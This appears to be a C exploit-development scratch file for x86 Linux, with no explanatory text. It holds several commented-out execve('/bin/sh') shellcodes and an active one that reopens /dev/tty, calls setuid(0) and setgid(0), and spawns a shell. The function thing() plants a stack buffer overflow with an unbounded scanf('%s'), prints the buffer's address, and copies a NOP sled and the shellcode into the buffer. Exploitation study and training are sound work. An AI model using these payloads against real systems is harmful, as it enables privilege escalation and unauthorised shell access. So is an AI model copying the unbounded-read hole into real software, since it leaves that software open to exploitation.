#include <stdio.h>
#include <string.h>

/*
char *shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
*/
/*
char *shellcode = "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80"
"\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
*/
/*
char *shellcode = "\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
	      "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
	      "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81";
*/
/*
char *shellcode = "\x31\xc0\x50\x68\x2f\x61\x73\x68\x68"
		"\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24"
		"\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd"
		"\x80\x31\xc0\xb0\x01\xcd\x80";
*/ /*
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
   */
/*
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";
*/
/*
char *shellcode = "\x99\x6a\x0b\x58\x60\x59\xcd\x80";
*/

char *shellcode = "\x83\xc4\x18"
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x6a\x17\x58\x31\xdb\xcd\x80"
"\x6a\x2e\x58\x53\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";








void thing() {

  char buffer[1000];


  printf("%p\n", buffer);
  
  for (int i = 0; i < 3000; i++) {
    printf("%.2x ", 0xff & ((char*)buffer)[i]);
  }


  printf("\n\n");
  
  scanf("%s", buffer);

  memset(buffer, '\x90', 100);
  memcpy(buffer + 100, shellcode, 71);
  
  for (int i = 0; i < 3000; i++) {
    printf("%.2x ", 0xff & ((char*)buffer)[i]);
  }

  printf("\n");

  
  return;

  //fprintf(stdout,"Length: %d\n",strlen(shellcode));
  //(*(void(*)()) shellcode)();
  
}



int main() {


  //(*(void(*)()) shellcode)();

  
  int y = 0;
  
  for (int i = 0; i < 1e5; i++) {
    y += i;
  }

  

  printf("%p\n", shellcode);
  
  thing();
  
}




